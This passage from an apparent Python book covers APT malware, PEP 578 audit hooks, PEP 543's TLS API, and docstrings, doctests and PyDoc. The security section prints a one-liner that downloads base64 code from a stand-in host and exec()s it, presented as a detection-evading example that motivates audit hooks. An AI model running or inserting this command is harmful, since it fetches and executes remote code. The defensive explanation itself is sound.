<p>The systems that are infected first are often not the end targets; they are simply the most accessible. However, these infected systems act as pivot points to greater prizes within the network. For example, a developer's computer, connected to the internet as well as internal networks, may provide direct access for an attacker to get into production systems. As many low-grade systems as possible may be infected, just to make complete eradication more difficult.</p>
<p>The biggest problem with detecting such malware is an inability to see exactly what is happening to systems on the network. While most systems have logging capabilities, capturing everything overloads system administrators with data, trying to find the needles in a progressively larger haystack. In addition, logs take up space very quickly, and there is only so much space that can be allocated to log files.</p>
<p>Not only that, but logs are frequently filtered to display only errors and similar problems, not minor discrepancies. A properly written APT program shouldn't be causing such errors, so they wouldn't be detected by a normal log review. One possible way to do this is to write the malware to use the tools that are already installed on the target system, so malware use will be hidden within the normal, expected traffic.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Python and security</h1>
                </header>
            
            <article>
                
<p>Python is popular for security purposes, both positive and negative, as it is commonly found on servers, as well as developer machines. It allows for the ability to execute code without having to use pre-compiled binaries, and it has zero internal auditing. For example, <kbd>launch_malware.py</kbd> (provided within the PEP) shows how easy it is to download, decrypt, and execute malicious software using a single Python command:</p>
<div>
<pre>python -c "import urllib.request, base64;
    exec(base64.b64decode(
        urllib.request.urlopen('http://my-exploit/py.b64')
    ).decode())"</pre>
</div>
<p>This code tells the Python interpeter to execute the command that is provided. That command imports two libraries (<kbd>urllib.request</kbd> and <kbd>base64</kbd><em>)</em>, then tells the system to execute a command that was decoded from a <kbd>base64</kbd>-encoded file that is downloaded from a web site.</p>
<p>Currently, most security-scanning tools that rely on signature files or otherwise recognizable code will not register this command as malicious, as <kbd>base64</kbd> encoding is frequently good enough to fool these systems. Because there is no file access, and assuming that Python is listed as an approved system application that is allowed to access the network and internet, this command would bypass any checks to block file access, check permissions, automated auditing and login, and verification of approved applications.</p>
<p>Because no system is 100% secure, especially if it has to communicate to other systems, many security professionals assume their systems have been attacked but they just haven't discovered the attacks yet. Hence, detection, tracking, and removal of malware is the main focus of security activities. This is where Python comes in; the ability to see what the Python runtime interpreter is doing at any given time can help indicate whether malicious, or at least unusual, activity is occurring.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>The core part of this PEP is the introduction of two APIs that enable sysadmins to integrate Python into their security setup. The key factor is that these APIs don't impose certain restrictions on how the systems should be configured, or their behavior:</p>
<ol>
<li>The audit hook API allows operations to generate messages and pass them up the stack to the operator. These operations are normally buried within the Python runtime or standard library, preventing normal access to them, such as module imports, DNS resolution, or dynamic code compilation.</li>
</ol>
<p style="padding-left: 60px">The following code shows how the PEP defines the API in the C code underlying Python.&#160;The new Python APIs for audit hooks are shown in <kbd>audit_hook_api.py</kbd>:</p>
<pre style="color: black" class="listings">      # Add an auditing hook
      sys.addaudithook(hook: Callable[str, tuple]) -&gt; None

      # Raise an event with all auditing hooks
      sys.audit(str, *args) -&gt; None</pre>
<ol start="2">
<li>An audit hook is added by calling <kbd>sys.addaudithook()</kbd> <span>in Python code, or</span> <kbd>PySys_AddAuditHook()</kbd> <span>for a lower-level call to the C code. Hooks cannot be deleted or replaced. Existing hooks are cognizant of auditing, so adding a new hook (which is audited) can cause an existing hook to raise an exception if it is attempted to add a new hook:</span></li>
</ol>
<ul>
<li>
<ul>
<li>When something of interest occurs, <kbd>sys.audit()</kbd> is called. The string argument is the name of the event, and the remaining arguments are whatever the developer determines to be necessary to provide for auditing.</li>
<li>During auditing, each hook is reviewed in a FIFO manner. If a hook returns an exception, later hooks are ignored, and the Python interpreter should quit (generally speaking). Of course, the developer is free to determine what happens when an exception occurs, such as logging the event, aborting the operation, or killing the process.</li>
<li>If no hooks have been set when an audit occurs, nothing much should happen. The audit call should have a minimal effect on the system, as the arguments should just be references to existing data, rather than calculations.</li>
<li>Since hooks may be Python objects, they need to be freed when the <kbd>finalize</kbd> function is called. In addition to releasing hooks, <kbd>finalize</kbd> will also relinquish any heap memory used. While it is a private function, it does trigger an event for all audit hooks, to ensure unexpected calls are logged.</li>
</ul>
</li>
</ul>
<ol start="3">
<li>The verified open hook API is designed to provide a way to identify files that can be executed versus those that cannot. Obviously, this is an important feature for security systems to prevent executing commands, code, or data that shouldn't be allowed to run in a particular environment. The following code defines the C code for the API.</li>
</ol>
<p style="color: black;padding-left: 60px" class="standard">The Python API for the verified open hook is shown in <kbd>hook_handler_api.py</kbd>:</p>
<pre style="color: black" class="listings">        # Open a file using the handler
        _imp.open_for_import(path)</pre>
<ul>
<li>
<ul>
<li>The Python API function is designed to be a complete replacement for <kbd>open(str(path), "rb")</kbd>, and its default behavior is to open a file for binary read-only access. When the function is called with a hook that is set, the hook will receive the path argument and immediately return its value, which should be an open, file-like object that reads raw bytes.</li>
</ul>
</li>
</ul>
<p style="color: black;padding-left: 150px" class="standard">This design is to allow a <kbd>BytesIO</kbd> instance if the file has already been read into memory, to perform any necessary verification regarding whether the file content is allowed to be executed. If it is determined that the file shouldn't be executed, an exception is raised by the hook, as well as any additional auditing messages.</p>
<ul>
<li>
<ul>
<li>All import and execution functionality involving code files will be changed to use <kbd>open_for_import()</kbd>. However, it is important to note that any calls to <kbd>compile()</kbd><em>,</em> <kbd>exec()</kbd><em>,</em> and <kbd>eval()</kbd> will not use this function; a specific audit hook, including the code from these calls, is necessary to validate the code. Most imported code will go through the API for <kbd>compile()</kbd>, so redundant verification should be avoided.</li>
</ul>
</li>
</ul>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">PEP 543 –&#160;Unified TLS API</h1>
                </header>
            
            <article>
                
<p>PEP 543 was introduced in October, 2016, for Python version 3.7, and is still in <em>Draft</em> status. Its goal is to define a standard TLS interface for Python, as a collection of abstract base classes. This interface would allow Python to bind to TLS libraries other than OpenSSL, to reduce dependence on the OpenSSL environment. By using abstract classes, programs can still use the Python interface for the standard <kbd>ssl</kbd> module, while actually using a different security library.</p>
<p>With the <kbd>ssl</kbd> module as a part of the Python standard library, it naturally has become the go-to tool for TLS encryption. However, some developers would prefer to use a different library other than OpenSSL, and incorporating these alternate libraries into their programs requires them to learn how to do it effectively, while maintaining a cohesive experience for the target platform.</p>
<p>The following is a list of problems with the current Python TLS configuration:</p>
<ul>
<li>Improvements in OpenSSL, such as higher-security TLS, cannot be easily accomplished without recompiling Python to use the new OpenSSL version. There are third-party bindings to OpenSSL, but using them requires adding another level of compatibility into a program.</li>
<li>The Windows OS does not include a copy of OpenSSL, so any Python distributions need to include OpenSSL to ensure its availability to developers and users. This turns the Python dev team into OpenSSL redistributors, with all the responsibilities associated with that role, such as ensuring security updates are delivered when OpenSSL vulnerabilities are discovered.</li>
<li>macOS is in a similar situation. Python distributions either need OpenSSL included with them, like Windows, or need to be linked to the OS-level OpenSSL library. Unfortunately, Apple has deprecated linking to the OS library, and the library itself has been unsupported for several years. At this point, the only thing to do is provide OpenSSL with Python for macOS, which leads to the same problems as on Windows.</li>
<li>Many OSes do not allow their system encryption certificate databases to be accessed by OpenSSL. This requires users to either look for alternate locations to get their root-level trust certificates, or to export the OS certificates to OpenSSL. Even if OpenSSL is able to access the system-level certs, validation checks may be different between the libraries, resulting in unexpected behavior when using native tools.</li>
<li>For users and developers who would prefer to use alternative TLS libraries, such as for support for TLS 1.3 or for embedded implementations of Python, the primary option is to use third-party libraries to interface with their TLS library of choice, or to figure out how to force their selected library into Python's <kbd>ssl</kbd> module API.</li>
</ul>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>The PEP proposes several new abstract base classes, and an interface that accesses these classes. They can be used to access TLS functionality without being tightly linked to OpenSSL:</p>
<ol>
<li>The following interfaces, currently used by Python, require standardization:
<ul>
<li>Configuring TLS, currently set by the <kbd>ssl.SSLContext</kbd> class.</li>
<li><span>In-memory buffer for encryption/decryption without actual I/O, currently set by the&#160;<kbd>ssl.SSLObject</kbd> class.</span></li>
<li>Wrapping a socket object, currently done via <kbd>ssl.SSLSocket</kbd>.</li>
<li>Putting the TLS configuration to the wrapper objects indicated previously, currently done by <kbd>ssl.SSLContext</kbd>.</li>
<li>Specifying the TLS cipher suites, currently handled by using the OpenSSL cipher suite strings.</li>
<li>Specifying application-layer protocols for the TLS handshake.</li>
<li>Specifying TLS versions.</li>
<li>Reporting errors to the calling function, currently done via <kbd>ssl.SSLError</kbd>.</li>
<li>Specifying the client/server certificates to load.</li>
<li>Specifying the trust database to use when validating certificates.</li>
<li>Accessing these interfaces at runtime.</li>
</ul>
</li>
<li>In light of the buffers and sockets mentioned in the preceding list, the PEP aims to provide an abstract base class for wrapped buffers, but a concrete class for wrapped sockets.</li>
</ol>
<p style="color: black;padding-left: 60px" class="standard">This creates the problem that a small number of TLS libraries won't be able to be bound to the abstract class, because those libraries can't provide a wrapped buffer implementation, such as an I/O abstraction layer.</p>
<ol start="3">
<li>When specifying TLS cipher suites, abstract classes won't work. So, this PEP aims to provide a better API for cipher suite configuration, which can be updated to support different cipher suites based on the necessary implementation.</li>
</ol>
<ol start="4">
<li>When specifying the client/server certificates to load, a problem comes from the possibility that the private certificate key could become available in memory; that is, it could potentially be extracted from process memory. Thus, the certificate model needs to allow for implementations to provide a higher level of security by preventing key extraction, while also allowing for implementations that cannot meet the same requirements. The lower standard would simply maintain the current methodology: loading the certificate from in-memory buffer or from a file.</li>
<li>Specifying a trust database is difficult, because different TLS implementations vary in how they allow users to select their trust stores. Some implementations use specified formats only used by that particular implementation, while others may not allow for specifying stores that don't include their default trust store. Therefore, this PEP defines a trust store model that requires little information regarding the form of the store.</li>
<li>Because <kbd>ssl.SSLContext</kbd> <span>manages different features (holding and managing configurations, as well as using configurations to build wrappers), it is proposed to split these responsibilities into separate objects.</span></li>
</ol>
<p style="padding-left: 60px">The <kbd>ssl</kbd> <span>module provides a server with the ability to modify the TLS configuration in response to a client's request for a hostname. This allows the server to change the certificate chain to match the chain needed for the hostname.</span></p>
<p style="padding-left: 60px" class="standard">However, this method doesn't work for other TLS implementations. Those ones frequently provide a return value from the callback, indicating which configuration changes need to be made. This requires an object that can accept and hold the TLS configuration.</p>
<p style="padding-left: 60px" class="standard">Therefore, the PEP proposes splitting <kbd>SSLContext</kbd> into separate objects: <kbd>TLSConfiguration</kbd> acts as a container for the configuration, while the&#160;<kbd>ClientContext</kbd> and <kbd>ServerContext</kbd> objects are instantiated by <kbd>TLSConfiguration</kbd><em>.</em></p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>The PEP goes into further detail on how the API would actually be implemented, examples of how different TLS libraries provide the same functionality, and so on. There are a lot of details that aren't relevant to this book, but for those readers interested in utilizing TLS libraries in their projects, the details are worth reviewing, as the changes should be showing up in a future version of Python.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Documenting with LyX</h1>
                </header>
            
            <article>
                
<p>This chapter will cover Python documentation. Specifically, we will discuss how to document code, both within your program and through external documents. We will cover:</p>
<ul>
<li>Python documentation tools and techniques</li>
<li>In-line comments and the <kbd>dir</kbd> command</li>
<li>Using docstrings</li>
<li>Using PyDoc help</li>
<li>HTML reports</li>
<li>Using <kbd>reStructuredText</kbd> files</li>
<li>Using the Sphinx documentation program</li>
<li>Using the LaTeX and LyX document preparation programs</li>
</ul>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Introduction</h1>
                </header>
            
            <article>
                
<p>Documenting code is the bane of many a programmer's existence. While code documentation is important, some programmers prefer to leave that work to technical writers. Others will provide a bare minimum of information, sometimes as README files or other external documents. Generally speaking, unless a program is supported by a company or organization, homebrew software has just enough information to tell you how to use it.</p>
<p>To be honest, some documentation comes across as being notes from the development timeline, rather than useful documentation. Many authors give up on installing a program because the documentation is inadequate, particularly when troubleshooting a bad install.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Python documentation tools and techniques</h1>
                </header>
            
            <article>
                
<p>When writing code documentation, there are a number of tools and techniques to choose from. In this section, we will discuss some of the most common methods used by developers.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<ol>
<li><strong>Code obfuscation</strong>: First, a quick diversion into how to make your code difficult to read. There are valid reasons to obfuscate your code and make it difficult to read, such as attempting to prevent reverse-engineering. Other people just like the challenge; consider the International Obfuscated C Code Contest (<a href="http://ioccc.org">http://ioccc.org</a>).</li>
</ol>
<p style="color: black;padding-left: 60px">On the other hand, making your code difficult to read can be an attempt to create malware that can bypass detection programs. One example is <kbd>JSF**k</kbd>, which converts JavaScript code into the atomic parts of JavaScript using only six different symbols, as shown in <kbd>jsf.js</kbd> from <a href="http://www.jsfuck.com">http://www.jsfuck.com</a>.&#160;<span>The</span> file demonstrates the obfuscated equivalent of <kbd>alert("This was a hidden message")</kbd><span>, but any valid JavaScript code can be replicated using the <kbd>JSF**k</kbd> utility. As a matter of fact, jQuery has been encoded into a fully-functional, drop-in replacement <kbd>JSF**k</kbd> version (jQuery Screwed), using only the six characters available.</span></p>
<ol start="2">
<li><strong>Code as documentation</strong>: Code as documentation is probably the most basic level of documentation available, as it requires no additional information to be included, besides the code itself. Naturally, this requires the code to be written in a manner that makes it readily apparent what the code is doing and how it does it.</li>
</ol>
<p style="padding-left: 60px">While every language, theoretically, is capable of self-documenting itself, some are worse than others. Perl is commonly cited as a bad language, as it was designed to be quick to write scripts, but in a very concise manner; if a lot of effort was made initially, it will pay off later by making it easier to write programs (compared to writing a simple script in C). As such, if you aren't familiar with Perl, even a non-obfuscated script can be nearly impossible to read; see this example of Perl code (<kbd>perl_interactive.pl</kbd>):</p>
<pre>      perl -e 'do{print("perl&gt; ");$_x=&lt;&gt;;chomp <br/>      $_x;print(eval($_x)."\n")}while($_x ne "q")'</pre>
<p style="padding-left: 60px">The preceding code creates a Perl interactive shell. Because Perl doesn't have an interactive interpreter like Python, you have to coerce the system to create one for you. As mentioned, if you don't know how to read Perl, it doesn't provide you with any help.<br/>
Source code should be easily readable on its own, as it is the only true representation of your program; everything else is subject to human forgetfulness, as it is more likely to not be updated when the code is modified. This means using intelligent names for variables, functions, and so on; they should be indicative of what they do. This way, even with no other information, someone reading it can at least make a guess as to what the code is supposed to do.</p>
<ol start="3">
<li><strong>Comments</strong>: To this author, in-line comments are the minimum level of effort when it comes to documenting code. Unfortunately, too many online code samples don't have comments, forcing the reader to either look at external documentation or manually parse out what the code is doing.</li>
</ol>
<p style="padding-left: 60px">Online debates have occurred regarding comments, as some other programmers don't believe in comments, thinking that code should be self-documenting. Others feel that a simple, one-line comment explaining what a function is supposed to be doing is much easier and quicker to read and understand than spending ten minutes walking the code, especially if the original developer aimed to get the job done in as few lines as possible.</p>
<ol start="4">
<li><strong>dir command</strong>: While not something a programmer does <span>directly, Python allows the use of the</span> <kbd>dir</kbd> <span>command to list all of the functions and attributes available for a given module. Thus, using intelligent names for these items means that a simple</span> <kbd>dir</kbd> <span>call can provide a lot of information quickly.</span></li>
<li><strong>Docstrings</strong>: Docstrings are the lifeblood of Python documentation. They provide in-code documentation about the code, such as specifications of what parameters a function receives and what it returns when called. They also provide a brief synopsis of what each part of the code is supposed to do, in plain language.</li>
<li><strong>PyDoc</strong>: PyDoc is a built-in Python tool-set that leverages docstrings to provide useful information to the user. It is most easily utilized when calling <kbd>help(&lt;object&gt;)</kbd>.</li>
</ol>
<p>The preceding list isn't all-inclusive, but it does cover the features we will discuss in the rest of this chapter.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Inline comments and the dir command</h1>
                </header>
            
            <article>
                
<p>The simplest and most common way to document code is to simply add comments while writing the code. This can range from simple <kbd>TODO</kbd> reminders for the developers, to an explanation of why the developer coded something in a particular way.</p>
<p>As seen previously, comments in Python code start with a hash mark, <kbd>#</kbd>, and continue to the end of the line. Multi-line comments can be made by adding a hash mark at the beginning of each line, or triple quotation marks can be used instead. Keep in mind, though, that certain tools don't know about triple-quoted comments, so it's better to use them sparingly.</p>
<p>The problem with in-line comments is that they can only be seen if you are actively looking at the code. While we will discuss ways to access in-code comments, these basic one-liners are not actively culled by documentation parsers.</p>
<p>If, however, you want to see what functions a module provides to the developer, using the <kbd>dir()</kbd> function is one easy way of doing that. The following is information about what the <kbd>dir()</kbd> function provides:</p>
<div class="standard CDPAlignCenter CDPAlign"><img src="images/12509504-eb12-4004-aab4-cc88734aa852.png" style="width:41.25em;height:26.42em;"/></div>
<p>The following example shows <kbd>dir()</kbd> being used to show all of the functions available within the <kbd>math</kbd> module (which must be imported first):</p>
<div class="standard CDPAlignCenter CDPAlign"><img src="images/f7378978-e599-4083-800d-9f225208a10a.png" style="width:35.92em;height:51.25em;"/></div>
<p>There isn't a lot of extremely useful information when using <kbd>dir()</kbd>, but it can help if you only need to know what functions and attributes are available to you, without having to dig into more detailed documentation.</p>
<p>This is a good time to review how Python uses underscores. Entries with two leading underscores, such as <kbd>__doc__</kbd>&#160;from the screenshot, are attributes associated with the Python interpreter, and should not normally be directly called by the developer. Also, since they are predefined for Python's use, their names shouldn't be reused for a different purpose within a program. For example, using <kbd>__name__</kbd> as a variable name can result in program errors.</p>
<p>Single leading underscores indicate pseudo-private items. Because Python doesn't have public/private attributes like other languages, programmers have to be a little more cognizant of what they are trying to do. Pseudo-private items can be used like normal items; the underscore simply tells anyone looking at the code that the pseudo-private items shouldn't be used outside their intended area.</p>
<p>In addition, pseudo-private items won't be imported when using <kbd>from &lt;module&gt; import *</kbd>. This is part of their private nature. They will, however, be imported when using <kbd>import &lt;module&gt;</kbd>. Thus, to ensure all functions and attributes are available to you when importing a module, you need to use the regular <kbd>import</kbd>. Of course, accessing those items will require you to clarify them using dot-nomenclature: <kbd>&lt;module&gt;.&lt;item&gt;</kbd>.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using docstrings</h1>
                </header>
            
            <article>
                
<p>Docstrings are triple-quoted strings that have special significance within Python. When used, they form the <kbd>__doc__</kbd> attribute of an object. While not using docstrings is fine, and there are many examples of projects that don't have them if you do use them, it is worth looking at PEP 257 to see how to do them right. While violating the guidelines in the PEP won't hurt your code but may make other programmers question you, it will really hurt if you try to use tools such as Docutils, as they expect docstrings to be properly formatted.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<ol>
<li>Docstrings are the very first items in a module, function, class, or method; if they are put elsewhere, chances are, tools that won't recognize them as docstrings.</li>
<li>Docstrings can be single or multi-line, as shown in the following,&#160;<kbd>docstring_example.py</kbd>:</li>
</ol>
<pre>        def get_pressure():<br/>            """Returns the pressure in the system."""<br/>            return sys_press<br/><br/>        def calc_press_diff(in, out):<br/>            """Calculates the pressure drop across a valve.<br/><br/>            :param in: Input pressure<br/>            :param out: Output pressure <br/><br/>            :return The valve pressure drop<br/>            """<br/>            deltaP = out - in<br/>            return deltaP</pre>
<ol start="3">
<li>By convention, single-line docstrings are for obvious use cases. The reason triple quotes are used, even for one line, is to easily allow for future expansion of the docstring, if needed.</li>
<li>A single-line docstring should be considered a summary statement of the object and should end with a period, as it should describe what the object does, that is, <em>Does this</em> or <em>Returns this</em>. They shouldn't be a description of the action; for example, <em>Returns the pathname of the root-level object</em>.</li>
</ol>
<p style="padding-left: 60px">You'll note that, in the preceding example, both docstrings failed to follow this guidance. As these are guidelines and not hard-and-fast rules, this is allowed. This author just feels more comfortable explaining what is going on within the docstring, even if it is redundant to the actual code. This comes back to the fact that it is easier to read what something does and then see the code that implements it,&#160;than having to decipher exactly what the code is supposed to do.</p>
<ol start="5">
<li>Multi-line docstrings have the summary statement, just like single-line docstrings, but then they continue with more information. The additional information can be anything the programmer feels is important, though PEP 257 provides guidelines for different objects. These are paraphrased in the following for one-stop-shopping:
<ul>
<li>Class docstrings should have one blank line between the end of the docstring and the first method. They should summarize the class's behavior, and list both public methods and instance variables.</li>
<li>If the class will be subclassed, and there is an interface for the subclasses, the subclass interface should be listed separately in the docstring. The class constructor should have its own docstring in the <kbd>__init__</kbd> method.</li>
<li>If a class is a subclass of another and primarily inherits its behavior, the subclass's docstring should indicate this and show the differences. The word <kbd>override</kbd> should be used to indicate where a subclass method replaces an inherited method. The word <kbd>extend</kbd> should indicate where a subclass method calls an inherited method and adds functionality.</li>
<li>Module docstrings should list the classes, exceptions, functions, and other objects that are exportable, with a one-line summary of each.</li>
<li>Package docstrings (located in the <kbd>__init__.py</kbd> module for the package) should list the modules and subpackages exported by the package.</li>
<li>Function/method docstrings should summarize behavior and document all arguments (required and optional), return values, side-effects, exceptions, and restrictions on when the function or method can be called. Any keyword arguments should also be noted.</li>
</ul>
</li>
<li>Another related part of docstrings are doctests. Doctests are actually handled by the <kbd>doctest</kbd> module, and look for texts within a docstring that look like interactive Python sessions, complete with the <kbd>&gt;&gt;&gt;</kbd> prompt. Any such code is executed as it was entered by the user within an interactive shell, and compared to the expected results.</li>
</ol>
<p style="padding-left: 60px">Doctests are commonly used to ensure docstrings are kept up-to-date by testing that the examples work with any changes to the code itself—for regression testing by checking that test files still work, and in tutorial development that includes input/output examples. The following is an example of a doctest (<kbd>doctest.py</kbd>):</p>
<pre>        """
        Factorial module.

        This module manually defines the factorial() function <br/>        (ignoring the fact that Python includes math.factorial()).<br/>        For example,

        &gt;&gt;&gt; factorial(4)
        24
        """

        def factorial(n):
            """Return the factorial of n.

            Normal loop
        &gt;&gt;&gt; for n in range(4): print(factorial(n))
        1
        1
        2
        6
        
        List comprehension
        &gt;&gt;&gt; [factorial(n) for n in range(6)]
        [1, 1, 2, 6, 24, 120]
        
        Normal factorial
        &gt;&gt;&gt; factorial(25)
        15511210043330985984000000

        Check for negative values
        &gt;&gt;&gt; factorial(-3)
        Traceback (most recent call last):
        ...
        ValueError: Value must be at least 0.

        Floating point values must end in "0":
        &gt;&gt;&gt; factorial(25.1)
        Traceback (most recent call last):
        ...</pre>
<pre>        ValueError: Float value is required to be equivalent to integer.
        &gt;&gt;&gt; factorial(25.0)
        15511210043330985984000000

        Check for outsized values:
        &gt;&gt;&gt; factorial(1e25)
        Traceback (most recent call last):
        ...
        OverflowError: Value is too large to calculate.
        """

        import math
        if not n &gt;= 0:
            raise ValueError("Value must be at least 0.")
        if math.floor(n) != n:
            raise ValueError("Float value is required to<br/>                              be equivalent to integer.")
        if n+1 == n:  # catch a value like 1e100
            raise OverflowError("Value is too large to calculate.")
        result = 1
        factor = 2
        while factor &lt;= n:
            result *= factor
            factor += 1
        return result


        if __name__ == "__main__":
            import doctest
            print(doctest.__file__)
            doctest.testmod()</pre>
<p>One of the hardest parts is writing tests to simulate an interactive session, as the following screenshot demonstrates:</p>
<div class="CDPAlignCenter CDPAlign"><img src="images/42761ba9-f9ba-4636-8cc4-683a5f68cc79.png" style="width:44.42em;height:25.92em;"/></div>
<p>At first glance, it looks like it should be the same answer. The problem comes in lining up the <kbd>doctest</kbd> output with where it would be if the command was manually typed in. However, when the test is correctly written, an uninformative response is provided by the system, as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img src="images/f3051b4c-cbcd-4cea-bad5-be7a77f90ffa.png" style="width:46.58em;height:7.00em;"/></div>
<p>This just means that all of the tests passed, much like how using the <kbd>unittest</kbd> module to create tests returns only a <kbd>.</kbd>&#160;for a successful test. To get something more meaningful, or to see how the test was conducted, you have to provide the <kbd>-v</kbd> option to the command, as follows:</p>
<div class="CDPAlignCenter CDPAlign"><img src="images/4f31df96-1e60-45ed-b110-c66ce86dfae1.png" style="width:33.50em;height:47.08em;"/></div>
<p class="mce-root CDPAlignLeft CDPAlign">There's a lot more to doctests than could be covered here, but what we covered is sufficient for most needs. The documentation goes into things such as pulling tests from external test files, rather than directly in line with the code; how to deal with exceptions; and similar material, as well as the backend details of how the doctest engine works.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>The following is a screenshot of the docstring for Python's <kbd>random</kbd> module:</p>
<div class="standard CDPAlignCenter CDPAlign"><img src="images/a38f6110-6d85-4f9b-ae72-9aa3f9c43462.png" style="width:38.58em;height:39.17em;"/></div>
<p>This information doesn't really tell you a lot about the module, as it is simply a description of it. To get more comprehensive information, you would have to use <kbd>help(random)</kbd><em>,</em> as follows:</p>
<div class="standard CDPAlignCenter CDPAlign"><img src="images/3565ab9f-5817-442a-abb6-779a4451e062.png" style="width:31.33em;height:49.92em;"/></div>
<p>This listing actually continues on for more than 20 pages of formatted text, much like Unix <kbd>man</kbd> pages. But this is everything you need to know about a module and what it contains; so, if you happen to not have internet access but need to know how to use a Python module, this is one way of doing it.</p>
<p>You can also do this with individual elements within a module. For example, the following screenshot shows the results of <kbd>help(random.seed)</kbd>:</p>
<div class="standard CDPAlignCenter CDPAlign"><img src="images/1723dfae-a334-45c4-8bbb-8e402d3467a1.png" style="width:42.75em;height:31.75em;"/></div>
<p>This same information is available by using <kbd>print(random.seed.__doc__)</kbd>, if you prefer that route:</p>
<div class="standard CDPAlignCenter CDPAlign"><img src="images/036bc2b0-f510-48d8-bc4d-df127fb0fd8f.png" style="width:43.67em;height:20.50em;"/></div>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using PyDoc help</h1>
                </header>
            
            <article>
                
<p>If you use docstrings appropriately, you can harness the power of PyDoc, which is a built-in Python toolset that can extract docstrings and other information and format them into easy-to-read text. While there are many other tools available, PyDoc comes with Python, so you can be sure of it being available (as long as you have access to the Python standard library).</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<ol>
<li>PyDoc is accessed by using the <kbd>help()</kbd> function, as seen previously. While built-in objects can have multiple pages of information, your code doesn't have to be as elaborate, unless you want it to be. Depending on the Python version being used, you don't have to import the module you want help on, but it is generally better to import it, just to make sure.</li>
</ol>
<p>&#160;</p>
<ol start="2">
<li>Looking back at the preceding&#160;<kbd>random()</kbd> example, you can see that a lot of information is available via <kbd>help()</kbd>; of course, it is all dependent on how much information the developer decides to put into the docstrings. Functionally, the output is very much like using the Unix <kbd>man</kbd> command to view online command manuals.</li>
<li>One of the great things about <kbd>help()</kbd> is that it can be used on any Python object, not just modules, when calling <kbd>help(list)</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/a2829ffb-75b0-42b6-be9a-d30f9892cebd.png" style="width:42.58em;height:32.58em;"/></div>
<ol start="4">
<li>You can even look at the functions and methods that are included with a Python object, such as <kbd>help(list.pop)</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/b058342b-d126-4e4f-96f8-e8169357ee11.png" style="width:39.58em;height:8.67em;"/></div>
<ol start="5">
<li>In addition to using the name of the object type (for example,&#160;<kbd>list</kbd>), you can even use the actual object structure, as shown with <kbd>help([].sort)</kbd>:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/c1dc3e3b-64cc-4fd2-b01c-fd94643352d2.png" style="width:40.67em;height:8.83em;"/></div>
<ol start="6">
<li>The preceding examples show why following the recommended docstring guidelines is so important. There is an expected way for the information to be displayed, and, as a developer, you don't know what methods users of your code will use to access the help features available for Python. At a minimum, internal consistency within your project is important, even if you don't follow the official Python guidelines.</li>
</ol>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">HTML reports</h1>
                </header>
            
            <article>
                
<p>For people who prefer a more visual help tool, or prefer to keep a browser open, PyDoc includes the ability to create HTML files from the official Python documentation. Depending on the version of Python being used, there are several different ways to access the HTML information.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<ol>
<li>Starting in Python 3.2, help web pages can be opened by using <kbd>python -m pydoc -b</kbd>. If you have both Python 2 and 3 installed, you can specify which Python version you desire to work with; for example,&#160;<kbd>python3 -m pydoc -b</kbd><em>.</em> If you are using Python 2, then use the command <kbd>python -m pydoc -p &lt;port&gt;</kbd>. The port number can be 0, which will pick a random, unused port address for the web server.</li>
<li>Regardless of which version you use, it should open up a web page similar to the following screenshot:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/1fc57159-1c5b-4926-9739-bf58db8746df.png" style="width:50.50em;height:41.58em;"/></div>
<ol start="3">
<li>All of the modules available in Python are shown as hyperlinks. You can also search for entries via the <em><span class="packt_screen">Search</span></em> box; alternatively, if you know the name of the module you're interested in, enter it directly into the <span class="packt_screen">Get</span> box. When clicking on the hyperlinks, you will get the same information provided on the Python website or by using the <kbd>help()</kbd> command, as follows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/4ed1b35e-7a5c-402f-ba78-d411e4f9aa27.png"/></div>
<ol start="4">
<li>In addition to the built-in modules, if you run PyDoc from a virtual environment, you'll receive information about the virtual environment, as follows:</li>
</ol>
<div class="CDPAlignCenter CDPAlign"><img src="images/3d2ce927-264a-4a99-a416-5ad997cfe50e.png"/></div>
<p style="padding-left: 60px" class="CDPAlignCenter CDPAlign CDPAlignLeft">This way, you can not only view the default modules available within Python, but you can see what has has been placed in your virtual environment, if desired.</p>
<ol start="5">
